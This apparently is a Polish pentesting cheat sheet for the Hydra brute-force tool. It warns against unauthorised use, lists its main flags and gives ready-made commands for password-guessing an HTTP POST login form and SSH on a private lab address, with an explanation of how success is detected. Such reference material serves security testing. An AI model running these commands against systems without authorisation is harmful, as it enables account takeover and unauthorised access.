---
title: Hydra
layout: layouts/post.html
tags: cheatsheets
short: Narzędzie do brute force
date: 21/12/2025
---

Hydra jest narzędziem do ataków siłowych dla pentesterów. Nie używaj tego narzędzia na systemach lub aplikacjach, które nie należą do ciebie lub na testowanie których nie masz zgody.

### Ważne parametry:

```txt
-h => pomoc
-l => pojedyncza nazwa użytkownika
-L => ścieżka do słownika z nazwami użytkownika
-p => pojedyncze hasło
-P => ścieżka do słownika z hasłami
-C => ściezka do słownika z parami login:hasło. Używane zamiast -L i -P
-s => port, jeżeli jest inny niż domyślny
-M => ścieżka do pliku z listą celów
-t => liczba wątków (domyślnie 16)
-U => pomoc dla konkretnego modułu
```

### Pomoc dla modułu:

```sh
hydra -U http-post-form
```

### HTTP POST

```sh
hydra -L users.txt -P passwords.txt 10.0.0.2 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

Takie polecenie:

- Wysyła żądania POST na URL `http://10.0.0.2:8080/login`
- Zawiera w body każdego żądania `login:username=^USER^&password=^PASS^`, gdzie ^USER^ to wartość ze słownika users.txt, a ^PASS^ ze słownika passwords.txt
- Kontynuuje atak jeżeli w odpowiedzi znajduje się ciąg znaków "Invalid", w przeciwnym wypadku przerywa z powodu odnalezienia szukanych wartości

### SSH

```sh
hydra -L /wordlists/useres.txt -P /wordlists/passwords.txt -t 8 ssh://10.0.0.2
```

```sh
hydra -l admin -P /wordlists/passwords.txt -t 8 10.0.0.2 ssh
```
